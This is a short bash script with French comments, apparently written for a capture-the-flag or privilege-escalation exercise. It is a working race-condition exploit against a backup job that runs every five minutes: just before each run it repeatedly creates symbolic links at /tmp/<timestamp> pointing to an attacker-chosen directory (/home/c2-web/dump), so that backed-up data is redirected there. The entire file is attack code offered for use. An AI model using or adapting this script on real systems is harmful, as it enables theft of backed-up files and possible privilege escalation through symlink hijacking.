#!/bin/bash

# Répertoire cible où le backup sera redirigé via le lien symbolique
TARGET="/home/c2-web/dump"

# Intervalle de backup en secondes : 5 minutes = 300 secondes.
INTERVAL=300

# Durée de la fenêtre pendant laquelle tenter la création (en secondes)
WINDOW=2

echo "Exploitation précise du backup lancée..."
echo "Le script attendra jusqu'au prochain démarrage du backup."
echo "Appuyez sur CTRL+C pour interrompre."

while true; do
    # Obtenir le timestamp actuel en secondes
    NOW=$(date +%s)
    # Le reste avant le prochain cycle de 5 minutes
    REM=$(( NOW % INTERVAL ))
    # Calculer le temps à attendre jusqu'à 1 seconde avant le prochain démarrage
    SLEEP_TIME=$(( INTERVAL - REM - 1 ))
    
    echo "[$(date)] Dormir pendant $SLEEP_TIME secondes..."
    sleep $SLEEP_TIME

    echo "[$(date)] Fenêtre d'exploitation ouverte !"
    # Pendant la fenêtre définie, essayez de créer le lien toutes les 0.1 seconde
    END_TIME=$(($(date +%s) + WINDOW))
    while [ $(date +%s) -lt $END_TIME ]; do
        CURRENT_TS=$(date +%s)
        # Tente de créer le lien si inexistant pour le timestamp actuel
        if [ ! -L "/tmp/$CURRENT_TS" ]; then
            echo "[$(date)] Création du lien symbolique /tmp/$CURRENT_TS -> $TARGET"
            ln -s "$TARGET" "/tmp/$CURRENT_TS"
        fi
        sleep 0.1
    done
    echo "[$(date)] Fin de la fenêtre d'exploitation."
done
